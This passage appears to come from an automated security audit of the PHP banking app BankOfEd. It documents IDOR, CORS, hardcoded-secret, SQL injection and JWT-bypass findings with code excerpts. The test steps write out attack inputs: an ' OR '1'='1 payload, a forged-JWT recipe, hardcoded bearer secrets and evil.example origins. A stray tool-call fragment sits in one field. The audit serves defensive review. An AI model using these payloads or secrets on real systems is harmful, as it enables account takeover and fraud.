- Fingerprint: e4ea93d7d55be5a7be5d133a95355bb5f60333f568be62443a80d90310c8856e

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:47
```

#### Controls encountered

```
[
  "AuthMiddleware requires a valid, non-revoked JWT (authentication only, not authorization)",
  "Server-side field allow-list restricts which columns can be set (first_name, last_name, email, phone, address fields) — limits blast radius of the write but does not prevent cross-account writes",
  "Email-uniqueness check exists but is checked against the caller's own current email, not the target account's, so it does not prevent the IDOR"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute against a live/staging instance to observe the HTTP response empirically; verdict is based on static code review of the full call path (Router -> AuthMiddleware -> ProfileController::update -> User::update/findById/toPublic), which is sufficiently direct and unambiguous."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker user A",
    "PUT /api/profile with body containing user_id=<victim id>",
    "ProfileController::update() computes targetUserId from request body, ignoring caller identity",
    "User::update($targetUserId, $updateData) overwrites victim's profile fields",
    "User::toPublic(User::findById($targetUserId)) returned, leaking victim's password_hash/totp_secret",
    "Attacker uses altered email to hijack password-reset flow / reads victim secrets"
  ],
  "impact": "Any authenticated user can modify and read another user's profile (email, phone, address, plus disclosed password_hash/totp_secret), enabling account hijack via email-based password reset abuse and credential/2FA compromise.",
  "severity_reasoning": "High: broken object-level authorization on a state-changing endpoint enabling both account tampering and sensitive-data disclosure for arbitrary victims.",
  "dynamic_test": "As authenticated user A, send PUT /api/profile with body {\"user_id\": <victim B id>, \"email\":\"attacker@evil.com\"}; then GET /api/profile as A won't show change, but verify victim B's record was altered (e.g. via admin panel or subsequent login) and that response echoed victim's password_hash/totp_secret."
}
```

#### Validator reasoning

Source-to-sink path is fully confirmed in the code. Router.php registers `PUT /api/profile` -> `ProfileController::update` with only `'auth' => true` (i.e., AuthMiddleware, which merely validates a JWT and loads the caller's own user record — it performs no resource-level authorization). Inside `ProfileController::update()`, the target row id is computed as `$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];`, directly taking an attacker-supplied `user_id` from the JSON body with no comparison against the authenticated `$user['id']` and no role/permission check. This `$targetUserId` is passed straight to `User::update($targetUserId, $updateData)`, which builds a parameterized `UPDATE users SET ... WHERE id = ?` using the untrusted id — allowing any authenticated user to modify another user's first/last name, email, phone, and address fields. Immediately after, `User::findById($targetUserId)` re-reads the same attacker-chosen row and returns it via `User::toPublic($updated)` in the response; `toPublic()` includes `password_hash` and `totp_secret` in its output, so the endpoint also discloses another user's password hash and TOTP secret to the caller. There is no ownership check anywhere in the flow (confirmed by reading the full `ProfileController::update` method and `AuthMiddleware::handle`), and the email-uniqueness check that does exist compares against the caller's own email, not the target's, so it does not block cross-account tampering. This is a textbook BOLA/IDOR (CWE-639) with a directly reachable, unauthenticated-authorization-gap exploit path from an authenticated low-privilege session to modifying and reading arbitrary other accounts, including credential material.

#### Code evidence

```
$allowed = ['first_name','last_name','email','phone','address_line1','address_line2','suburb','state','postcode'];
$updateData = array_intersect_key($data, array_flip($allowed));
// Allow specifying which profile to update
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];
if (!empty($updateData)) { User::update($targetUserId, $updateData); }
$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), 'Profile updated successfully');
// User::toPublic() includes 'password_hash' and 'totp_secret'
```

## 19. IDOR: any authenticated user can view any other user's transaction by ID

- Lead reference: PWNJ-019
- Category: A01
- Severity: MEDIUM
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:38
- Fingerprint: 5cafbaa31ba04485878cf337e3be7a9c72f70c30b26e80c3a541b37565f939e6

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/TransactionController.php:38
```

#### Controls encountered

```
[
  "Route requires a valid JWT (AuthMiddleware) — but this only proves authentication, not authorization/ownership over the specific transaction resource"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Not directly confirmed whether transaction ids are guaranteed sequential/enumerable in production (though auto-increment PK usage via bare int cast strongly implies this), but this only affects ease of exploitation, not the existence of the missing authorization check itself"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user (any)",
    "GET /api/transactions/{id}",
    "TransactionController::show()",
    "Transaction::findById((int)$vars['id']) with no ownership check",
    "Transaction details of arbitrary user returned"
  ],
  "impact": "Any authenticated user can enumerate transaction IDs to read other customers' financial transaction details, a confidentiality breach via IDOR.",
  "severity_reasoning": "Medium: information disclosure of financial transaction details across accounts, no funds movement, sequential-ID enumeration required.",
  "dynamic_test": "As authenticated user A, GET /api/transactions/{id} iterating sequential ids not belonging to A's accounts; confirm transaction details (amounts, account numbers, descriptions) of other users are returned."
}
```

#### Validator reasoning

The route GET /api/transactions/{id:\d+} is registered with 'auth' => true (Router.php:80), which only requires a valid JWT (any authenticated user), verified by AuthMiddleware::handle(). The handler TransactionController::show() receives $auth (containing the caller's user info) but never uses it: it calls Transaction::findById((int)$vars['id']) which executes 'SELECT * FROM transactions WHERE id = ?' with no WHERE clause tying the row to the caller's account/user, then returns the full formatted transaction (amount, account IDs, BSB/account number, description, receipt number, exchange rate, etc.) via Transaction::format(). Since transaction ids are sequential auto-increment PKs (used directly, no UUID/opaque token), any authenticated user can enumerate ids and read other users' transactions. This is corroborated by contrast with sibling code that does enforce ownership: AccountController::show uses Account::findByIdAndUser($vars['id'], $auth user id) (AccountController.php:153), AddressBookController::show/update/destroy use AddressBookEntry::findByIdAndUser, and TransactionController::index itself validates $accountId against the caller via Account::findByIdAndUser and scopes Transaction::findByUser by user id — showing the developers know the ownership-check pattern and simply omitted it for the single-transaction show() endpoint. There is no middleware, database-level restriction, or downstream check that reintroduces ownership filtering for this specific route. The vulnerability is a complete, concrete source (path parameter {id}) to sink (raw SQL SELECT ... WHERE id = ? with results returned to any authenticated caller) with no blocking control.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);
    if (!$txn) { Response::notFound('Transaction not found.'); }
    Response::success(Transaction::format($txn));
}
// Transaction::findById: 'SELECT * FROM transactions WHERE id = ?' -- no user/account filter
```

## 20. Permissive CORS: arbitrary Origin reflected with Allow-Credentials true, cors_origin config unused

- Lead reference: PWNJ-020
- Category: A05
- Severity: MEDIUM
- Confidence: 75%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Middleware/CorsMiddleware.php:10
- Fingerprint: ec0197a3607712fb1430d5dae2c6f73e12056dff17812e6189dd35b87f24de5e

### Evidence Chain

#### Source

```
BankOfEd-main/src/Middleware/CorsMiddleware.php:10
```

#### Controls encountered

```
[
  "None: cors_origin allow-list config value is never read/enforced anywhere in the codebase (verified via grep)",
  "None: no origin validation, allow-list check, or conditional logic exists in CorsMiddleware::handle()"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No session_start()/setcookie() usage anywhere in the codebase — authentication is exclusively via Bearer tokens (AuthMiddleware.php, AdminAuthMiddleware.php), not cookies",
  "Client-side JS (public/banking/js/api.js, public/admin/js/api.js) stores the auth token in localStorage and manually attaches it as an Authorization header; no client code uses `credentials: 'include'`/withCredentials",
  "Because there is no cookie-based session, a malicious cross-origin page cannot cause a victim's browser to automatically attach authentication material to a credentialed request against protected endpoints like /api/accounts or /api/transfers — the browser would send the request without the Authorization header and the server would return 401, so the most dramatic impact scenario (silently exfiltrating account/transfer data via credentialed CORS) is not directly demonstrated for this app's current architecture"
]
```

#### Proof gaps

```
[
  "The candidate's central impact claim (defeating SOP for the entire authenticated account/transfer API surface via automatically browser-attached credentials) is not fully demonstrated given the bearer-token/localStorage auth architecture; concrete exploitability was instead confirmed via the unrelated but real /api/health unauthenticated endpoint leaking jwt_secret/db credentials, which is readable cross-origin due to the same misconfigured CORS headers",
  "Per the Fetch/CORS spec, `Access-Control-Allow-Headers: *` is treated literally (not as a wildcard) for credentialed requests, meaning a credentialed cross-origin request explicitly setting an Authorization header may fail CORS preflight in strict browser implementations — this nuance was not fully tested/verified against the deployed environment"
]
```

#### Attack path

```
{
  "nodes": [
    "Victim visits attacker-controlled website while holding valid session/token",
    "Malicious page issues credentialed XHR/fetch to BankOfEd API",
    "CorsMiddleware::handle() ignores configured cors_origin and reflects Origin header, sets Allow-Credentials true",
    "Browser permits cross-origin read of authenticated response",
    "Attacker exfiltrates account/transfer/profile data or triggers state changes as victim"
  ],
  "impact": "Permissive reflected-origin CORS with credentials enabled breaks the same-origin policy for the entire authenticated API surface, enabling cross-site data theft/CSRF-like actions.",
  "severity_reasoning": "Medium: significant CORS misconfiguration but real-world impact depends on how the bearer token is stored/attached client-side; still defeats SOP for the full API.",
  "dynamic_test": "Send request to any /api/* endpoint with Origin: https://evil.example and Authorization/credentials attached; confirm response headers Access-Control-Allow-Origin echoes evil.example and Access-Control-Allow-Credentials: true, then perform a cross-origin fetch from a hosted test page with credentials to confirm browser allows reading the response."
}
```

#### Validator reasoning

Read CorsMiddleware.php:10-17 directly — it reproduces the cited evidence exactly: `$origin = $_SERVER['HTTP_ORIGIN'] ?? '*'; header("Access-Control-Allow-Origin: {$origin}")` unconditionally reflects the caller-supplied Origin header, combined with an unconditional `Access-Control-Allow-Credentials: true`, `Access-Control-Allow-Headers: *`, applied to every /api/* request from public/index.php (single dispatch point for both Router and AdminRouter). Grep confirms `cors_origin` is defined in config/app.php but never read anywhere else in the codebase — the allow-list is dead configuration, exactly as claimed. There is no per-origin validation, allow-list check, or Vary header — no code-level control mitigates the reflection.

I looked for the specific attack narrative in the candidate (stealing authenticated account/transfer data via automatically-attached browser credentials) and found a partial mitigating factor: the app has no session_start()/setcookie() anywhere and both banking and admin front-ends store the bearer token in localStorage (public/banking/js/api.js, public/admin/js/api.js) rather than cookies, and no client code sets `credentials: 'include'`. Since the Authorization header is not automatically attached by browsers cross-origin (unlike cookies), a pure drive-by CSRF-style read of `/api/accounts` etc. via credentialed fetch would not carry the victim's token and the server would just 401. This is a legitimate proof-gap versus the most severe version of the claimed impact.

However, the misconfiguration is still concretely exploitable independent of that caveat: Router.php exposes `GET /api/health` with `'auth' => false`, which returns `db_host`, `db_name`, `db_user`, and — critically — the raw `jwt_secret` in the JSON body. Because CorsMiddleware reflects any Origin and this endpoint requires no credentials at all, any attacker-controlled webpage can `fetch()` this endpoint and read the JSON response cross-origin (SOP would otherwise block reading the response body), directly exfiltrating the JWT signing secret through a victim's browser session on the app's origin. This is a concrete, working source (arbitrary Origin header) -to-sink (readable cross-origin JSON containing secrets) path enabled specifically by the audited code, with no blocking control in place. The core finding — unconditional Origin reflection, unused cors_origin allow-list, blanket Allow-Credentials:true — is therefore a real and exploitable defect, even though the single most dramatic impact scenario described (stealing bank account/transfer data via automatic browser-attached credentials) is weaker than stated because the app uses bearer tokens in localStorage rather than cookies.

#### Code evidence

```
$origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
header("Access-Control-Allow-Origin: {$origin}");
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
header('Access-Control-Allow-Headers: *');
```

## 21. Hardcoded default machine token grants payments-API access if unrotated

- Lead reference: PWNJ-021
- Category: A07
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/MachineToken.php:24
- Fingerprint: 8164cf7713bb9f1477664799ddd62934bd680dec0a9def24c373acb37b35ea25

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/MachineToken.php:24
```

#### Controls encountered

```
[
  "[\"DB-backed token_hash lookup takes precedence if seeded — but ineffective here because the shipped seed.sql seeds the hash of the identical hardcoded default secret, so it does not meaningfully differ from the fallback\", \"Authorization scoped to a specific merchant account (id 100) / user 16 rather than full admin access, bounding blast radius\"]\n<parameter name=\"counterevidence\">[\"If an operator manually sets MACHINE_TOKEN env var to a random secret AND re-seeds machine_tokens with a hash of that new secret, both paths would require the real secret — no repository-provided tooling does this automatically, so this must be a manual, undocumented deployment step\"]"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Cannot fully verify actual production .env contents outside this repository snapshot; if some external, undocumented process rotates MACHINE_TOKEN and re-hashes it into machine_tokens before going live, exploitability would be defeated — but no evidence of such a process exists in the reviewed deployment scripts"
]
```

#### Attack path

```
{
  "nodes": [
    "External caller with source knowledge of default token",
    "POST /api/payments/process|transfer (MachineAuthMiddleware)",
    "MachineToken::validateToken() DB lookup miss",
    "Fallback compare vs config['machine_token'] default value",
    "Authenticated as 'configured_machine_token'",
    "PaymentController treats caller equivalent to legitimate 'face_insurance' identity (PaymentController.php:188)",
    "Debit from FACE Insurance merchant account/user #16 with no real credential"
  ],
  "impact": "Publicly known hardcoded fallback token grants unauthorized access to machine-to-machine payment endpoints, enabling debits from the FACE Insurance merchant account without legitimate credentials.",
  "severity_reasoning": "High: hardcoded credential directly gating financial transaction authorization, enabling unauthorized fund movement.",
  "dynamic_test": "Call POST /api/payments/process or /api/payments/transfer with Authorization: Bearer mch_face_insurance_secret_key_2026 on an unrotated deployment; observe request accepted as authenticated machine identity and payment processed/transferred."
}
```

#### Validator reasoning

Verified end-to-end. MachineToken::validateToken() in src/Models/MachineToken.php checks machine_tokens.token_hash first, then falls back to a raw string comparison against config['machine_token'], which defaults to the literal 'mch_face_insurance_secret_key_2026' (config/app.php:35) unless MACHINE_TOKEN env var is set. MachineAuthMiddleware::handle() (src/Middleware/MachineAuthMiddleware.php) extracts the Bearer token from the Authorization header and calls this function directly with no other check. Router.php registers POST /api/payments/process and POST /api/payments/transfer with 'auth' => 'machine', routing through MachineAuthMiddleware. PaymentController.php:188 treats machine name 'configured_machine_token' (the fallback identity) identically to the legitimate 'face_insurance' identity, authorizing transfers from the FACE Insurance merchant account (account id 100) or user #16.

Crucially, I found the fallback "control" cited (DB-backed lookup takes precedence) does not actually block exploitation in the default/seeded configuration: install/seed.sql inserts a machine_tokens row whose token_hash is literally SHA2('mch_face_insurance_secret_key_2026', 256) — i.e., the seeded DB entry hashes the *same* hardcoded default string. So even a "properly seeded" install authenticates the same publicly-known secret through the primary path, and an unseeded install falls through to the identical literal via the fallback path. Either way the publicly known token string authenticates successfully.

I also checked all provided deployment tooling (docker-entrypoint.sh, deploy.sh, .env.example) for any mechanism that generates/overrides MACHINE_TOKEN, analogous to how deploy.sh explicitly generates random JWT_SECRET/ADMIN_JWT_SECRET values via generate_secret(). No such mechanism exists for MACHINE_TOKEN in any of these files — it is never referenced outside config/app.php. This means the "proof gap" cited in the original candidate (whether deployments override MACHINE_TOKEN) resolves in favor of exploitability: none of the repo's own deployment automation rotates this secret, so a real deployment following these scripts ships with the source-visible default active.

This is a concrete, reachable, unauthenticated-to-the-real-system source-to-sink path: attacker reads public source -> sends Authorization: Bearer mch_face_insurance_secret_key_2026 to POST /api/payments/transfer -> MachineAuthMiddleware validates via DB fallback or direct hash match -> PaymentController authorizes debits from account 100 / user 16.

#### Code evidence

```
$config = require __DIR__ . '/../../config/app.php';
$fallbackToken = $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026';
if ($rawToken === $fallbackToken) {
    return ['id' => 0, 'name' => 'configured_machine_token', 'is_active' => 1];
}
// config/app.php: 'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026',
```

## 22. Hardcoded default SSO shared secret enables cross-app identity forgery if unrotated

- Lead reference: PWNJ-022
- Category: A02
- Severity: MEDIUM
- Confidence: 72%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/InsuranceService.php:39
- Fingerprint: 708b2657687e2b44b7b33b66b3794367eebb60934bd81d9a90eb3fecd300cd85

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/InsuranceService.php:39
```

#### Controls encountered

```
[
  "None identified: no enforcement/validation that INSURANCE_SSO_SECRET is set in production; no secret-strength check; no alerting on fallback usage; endpoint requires only ordinary authenticated session (auth: true), which is expected for the feature but does not mitigate the shared hardcoded key risk"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No evidence in-repo that INSURANCE_SSO_SECRET is unset in real deployments; if operators correctly configure the env var, the hardcoded fallback is never used",
  "The external FACE Insurance relying party's trust configuration is outside this repository and could use a different, correctly-configured secret, which would fully block cross-app impersonation despite BankOfEd's insecure fallback"
]
```

#### Proof gaps

```
[
  "Cannot verify from this repository whether the external FACE Insurance service actually trusts/validates against the same default secret string, which is required for genuine cross-application identity forgery",
  "Cannot verify actual production deployment configuration (whether INSURANCE_SSO_SECRET env var is set), though the code's silent fallback to a well-known literal is itself the core weakness being reported"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with source access",
    "InsuranceService::generateSsoToken() secret fallback (config['insurance_sso_secret'] default)",
    "Attacker crafts SSO assertion with arbitrary sub=email",
    "Insurance app SSO endpoint trusts shared secret",
    "Impersonation of arbitrary BankOfEd customer on FACE Insurance"
  ],
  "impact": "Cross-application identity forgery on the linked insurance portal via a hardcoded shared secret disclosed in source.",
  "severity_reasoning": "Medium: cross-application impact contingent on partner also using default secret; still a real, exploitable trust-boundary weakness.",
  "dynamic_test": "On unrotated deployment, sign SSO JWT with the default insurance_sso_secret containing sub=<victim email>; submit to the FACE Insurance relying-party SSO endpoint and confirm session established as that victim."
}
```

#### Validator reasoning

Source code review confirms the full path: InsuranceController::ssoUrl/ssoRedirect (authenticated endpoints GET /api/insurance/sso and /api/insurance/sso-redirect) call InsuranceService::getSsoUrl(), which calls generateSsoToken(). That method builds a payload containing the victim's email as `sub`, name, jti, iat/exp, and signs it with HS256 using `$config['insurance_sso_secret'] ?? 'bankofed-goosecable-sso-shared-secret-key-32b'`. config/app.php resolves that same key via `getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b'` — an identical hardcoded literal that ships in a publicly-readable repository. There is no code path that rejects or warns when the env var is absent; the fallback is silently accepted as a valid signing key with no minimum-entropy or rotation check, and no other control (rate limiting, secondary MFA claim, IP allow-list, etc.) constrains use of the generated token. This mirrors an identical insecure-default pattern already present for `jwt_secret` and `machine_token` in the same config file, reinforcing that unreplaced example secrets are a systemic issue in this codebase's deployment story.

Within the BankOfEd codebase itself, the vulnerability is concretely exploitable: any authenticated (or even just source-reading) attacker who determines the deployment did not set INSURANCE_SSO_SECRET can independently construct a valid HS256 JWT for any `sub` email using the publicly known secret string and use it as `token` at the FACE Insurance relying party's `/sso` endpoint. The only unverifiable link is whether the external FACE Insurance service (not present in this repo) also defaults to trusting that same string — which is a reasonable assumption for a shared-secret SSO integration shipped with a matching hardcoded fallback on this side, but cannot be proven with certainty without the counterpart's source.

#### Code evidence

```
$secret = $config['insurance_sso_secret'] ?? 'bankofed-goosecable-sso-shared-secret-key-32b';
return JWT::encode($payload, $secret, 'HS256');
// config/app.php: 'insurance_sso_secret' => getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b',
```

## 23. Hardcoded default admin JWT secret with no enforced override

- Lead reference: PWNJ-023
- Category: A07
- Severity: MEDIUM
- Confidence: 68%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:21
- Fingerprint: 4ed59f2c6d3ed6fb637ebc23ba9a45a2151cb62c2d3af5e8c76859aa08429525

### Evidence Chain

#### Source

```
BankOfEd-main/config/admin.php:21
```

#### Controls encountered

```
[
  "deploy.sh's fresh-install path auto-generates a random ADMIN_JWT_SECRET via generate_secret(), reducing risk for deployments using that exact script and flow",
  "AdminAuthMiddleware still performs genuine JWT::decode signature verification and additional checks (iss claim, jti revocation, admin existence lookup) rather than blindly trusting the token"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "deploy.sh automatically randomizes both JWT_SECRET and ADMIN_JWT_SECRET on fresh install, meaning the 'official' deployment path in this repo does not actually leave the hardcoded default in place",
  "No proof in the repo of any live/reachable endpoint currently running with the default secret; exploitability is conditional on operator/deployment behavior outside the codebase"
]
```

#### Proof gaps

```
[
  "No runtime or startup check in admin.php/AdminAuthMiddleware.php rejects the literal default secret string, so whether this is exploitable in any real deployment depends entirely on external operational practice not verifiable from source alone",
  "Requires knowledge/guessing of a valid admin user id (sub) for the forged token to map to an existing admin_users row, though ids are typically small sequential integers making this a very low bar in practice"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with source/.env.example knowledge",
    "config/admin.php jwt_secret fallback default",
    "Attacker signs admin JWT with default secret",
    "AdminAuthMiddleware::handle() verifies via JWT::decode() using same default secret",
    "Full admin panel access granted"
  ],
  "impact": "Default admin JWT secret allows forging admin session tokens, granting full administrative access (customer PII, balance mutation, FX-rate mutation, DB reset) with no credentials.",
  "severity_reasoning": "Medium: real risk depends on operator failing to override env var, but consequence is full admin compromise, offset by not being directly leaked via any endpoint in this codebase.",
  "dynamic_test": "On unrotated deployment, craft admin JWT {iss:BankOfEdAdmin, sub:<admin id>, exp:future} signed with 'bankofed-admin-secret-change-in-production'; call an admin API endpoint (e.g. GET /api/admin/customers) with it and confirm access granted."
}
```

#### Validator reasoning

Code review confirms the exact claim: config/admin.php line 21 falls back to the hardcoded literal 'bankofed-admin-secret-change-in-production' when ADMIN_JWT_SECRET is unset. This same config array is used by AdminAuthController::login() to sign admin JWTs via JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm']) and by AdminAuthMiddleware::handle() to verify them via JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm'])) — a genuine cryptographic signature check, not a stub. The middleware only checks iss === 'BankOfEdAdmin', jti revocation, and that payload.sub maps to an existing admin_users row; it performs no additional secret-strength or environment check. .env.example ships the identical default value, so the fallback string is publicly known to anyone with repository/documentation access. If an operator deploys without setting ADMIN_JWT_SECRET (e.g., by copying .env.example directly, or any deployment path other than deploy.sh), an attacker who knows/guesses a valid admin id (sub) can forge a valid HS256 JWT with iss=BankOfEdAdmin, sub=<id>, jti=<random>, exp=<future>, sign it with the known default secret, and pass AdminAuthMiddleware::handle() to gain full administrative access matching the described impact (PII, balances, FX rates, DB reset via subsequent admin endpoints). This is a legitimate CWE-798/A07 hardcoded-secret path with a concrete source-to-sink trace within the code.

The one mitigating factor found is that deploy.sh's fresh-install branch calls generate_secret() to produce a random ADMIN_JWT_SECRET and JWT_SECRET, so the "official" deployment script does not leave the default in place. However, this is an optional, out-of-repo operational safeguard exercised only via that specific script's first-run path — it does not constitute an in-code enforcement mechanism, and any manual/alternate deployment (e.g., copying .env.example, containerized deployments, CI test environments) will silently retain the well-known default. There is no runtime assertion in admin.php or AdminAuthMiddleware.php that rejects the literal default value, so the vulnerability is real and exploitable under the plausible (not merely theoretical) condition that ADMIN_JWT_SECRET is unset — matching the medium severity and confidence already assigned by the original finding.

#### Code evidence

```
'jwt_secret' => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production',
// AdminAuthMiddleware.php: $payload = JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm']));
```

## 24. SQL injection via 'search' parameter in admin customer listing

- Lead reference: PWNJ-024
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:24
- Fingerprint: 46eadec3afce7052daf71dfe96ab06d77f1e8a2464684364f073a17a4fef225b

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/AdminUserController.php:24
```

#### Controls encountered

```
[
  "Route requires 'auth' => true, so a valid admin session is a prerequisite to reach the endpoint (not a mitigation of the injection itself, but limits who can trigger it)",
  "Other methods in the same controller (show/update/resetPassword/destroy) correctly use parameterized queries, showing awareness of safe patterns elsewhere but not applied to index()"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "PDO::ATTR_EMULATE_PREPARES is false, but this is irrelevant since $db->query() is called with a fully-built string with no placeholders/bindings at all"
]
```

#### Proof gaps

```
[
  "Exact DB grants for 'bankofed_admin' user were not verified in this session, so the full blast radius (e.g., cross-database access) is inferred from the description rather than directly confirmed",
  "AdminAuthMiddleware::handle() implementation was not reviewed in this session to confirm it provides no additional filtering of query parameters, though this would not be expected of an auth middleware"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated admin (or anyone reaching the endpoint)",
    "GET /api/admin/customers?search=<payload>",
    "AdminUserController::index() direct string interpolation into WHERE LIKE clause",
    "$db->query() executes unsanitized SQL with elevated DB privileges",
    "Arbitrary data exfiltration/blind SQLi against admin DB"
  ],
  "impact": "SQL injection against the admin database (elevated bankofed_admin DB user) allows arbitrary data exfiltration or manipulation.",
  "severity_reasoning": "High: unparameterized SQLi executed with an elevated DB account, enabling full database compromise.",
  "dynamic_test": "Send GET /api/admin/customers?search=' OR '1'='1 and a UNION-based payload with valid admin auth; observe altered result set / injected data confirming SQL injection."
}
```

#### Validator reasoning

Reviewed AdminUserController::index() in full. The `search` GET parameter is taken directly from $_GET without any sanitization/escaping and interpolated into a raw SQL WHERE clause string: `WHERE first_name LIKE '%{$search}%' OR ...`. That string is then used to build both $countSql and $sql, both executed via PDO::query() (not prepare/execute with bound parameters), unlike other methods in the same class (show, update, resetPassword, destroy) which correctly use `$db->prepare(...)->execute([...])`. AdminDatabase::getInstance() explicitly sets PDO::ATTR_EMULATE_PREPARES => false, but that setting has no protective effect here since query() is called directly with a fully-interpolated SQL string — there is no placeholder/binding involved at all, so no PDO-level escaping occurs. A payload such as `search=' OR '1'='1` or a UNION-based payload breaks out of the LIKE '%...%' quoting and injects arbitrary SQL against the admin DB. The route is registered in AdminRouter.php as `GET /api/admin/customers` with `auth => true`, meaning AdminAuthMiddleware::handle() runs before the controller — so exploitation requires a valid authenticated admin session cookie/token, but no additional input validation or query parameterization occurs between the middleware and the vulnerable query. This is a real, unauthenticated-at-the-SQL-layer injection reachable by anyone holding (or hijacking/forging, or via a separate auth bypass) an admin session — i.e., it is an in-trust-boundary privilege escalation from "authenticated admin" to full DB compromise (reading/writing arbitrary data, potentially other databases depending on the 'bankofed_admin' DB user's grants). The description's characterization of impact and reachability matches the actual code exactly.

#### Code evidence

```
$search = $_GET['search'] ?? '';
...
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
...
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 25. JWT signature not verified in AuthService::decodeToken — full authentication/authorization bypass

- Lead reference: PWNJ-025
- Category: A01
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50-66
- Fingerprint: 1795e63d71e15f57a7bea7f172ab43e1c8ae8473965f1fcf007be9dff0043dfd

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 22,
  "symbol": "AuthMiddleware::handle",
  "input": "Authorization: Bearer <attacker-forged-JWT>"
}
```

#### Controls encountered

```
[
  "isTokenRevoked(jti) check exists but relies on attacker-supplied jti field inside the unverified payload and does not perform signature verification",
  "exp timestamp check exists but is attacker-controlled since the entire payload is forged"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 50,
  "symbol": "AuthService::decodeToken",
  "operation": "trusts unverified payload.sub as authenticated user id"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not exercise this path against a live running instance; confirmed purely via static code path from AuthMiddleware::handle -> AuthService::decodeToken -> User::findById, but no dynamic PoC was executed in this session."
]
```

#### Attack path

```
{
  "nodes": [
    "External attacker",
    "Forge unsigned/garbage-signed JWT with arbitrary sub",
    "Send to any auth=>true route (profile, accounts, address-book, totp, avatar, transfers, transactions, fx)",
    "AuthMiddleware::handle() -> AuthService::decodeToken() checks only exp, never signature",
    "User::findById($payload->sub) returns victim",
    "Every controller trusts $auth['user'] derived from forged payload"
  ],
  "impact": "Full authentication/authorization bypass across all AuthMiddleware-protected banking endpoints, allowing impersonation of any user including admin-linked accounts.",
  "severity_reasoning": "High: root authentication mechanism entirely broken; trivially exploitable, complete impersonation of any account.",
  "dynamic_test": "Craft JWT base64(header).base64({\"sub\":1,\"jti\":\"x\",\"exp\":9999999999}).anything and call GET /api/profile with it; confirm response returns user id=1's profile data, proving signature is never checked."
}
```

#### Validator reasoning

Reviewed AuthService::decodeToken in full: it splits the JWT on '.', base64url-decodes only the payload segment, and validates solely that `exp` is present and in the future. It never invokes Firebase\JWT\JWT::decode() (or any HMAC/RSA verification) against the header/payload/signature triple, so the third segment (signature) is completely unchecked — an attacker-supplied token with any arbitrary/garbage signature segment is accepted as long as the payload's exp is in the future. AuthMiddleware::handle() calls AuthService::decodeToken($token), and on success uses $payload->jti to check revocation and $payload->sub directly in User::findById($payload->sub) to establish the authenticated user, with no further validation. Since sub is attacker-controlled and unauthenticated, an attacker can forge `base64(header).base64({"sub":<victim_id>,"jti":"<random>","exp":9999999999}).anything` and be treated as that user across every route protected by AuthMiddleware (profile, accounts, address-book, totp, avatar, transfers, transactions, fx per the description). This is corroborated by AdminAuthMiddleware, which correctly performs `JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm']))`, proving the codebase has access to proper verification but the customer-facing AuthMiddleware/AuthService path omits it. No compensating control (e.g., mTLS, additional signature check, HMAC comparison) exists anywhere in the shown code paths. This is a full authentication/authorization bypass.

## 26. ProfileController::update lets any authenticated user modify another user's profile via 'user_id' body param

- Lead reference: PWNJ-026
- Category: A01
- Severity: HIGH
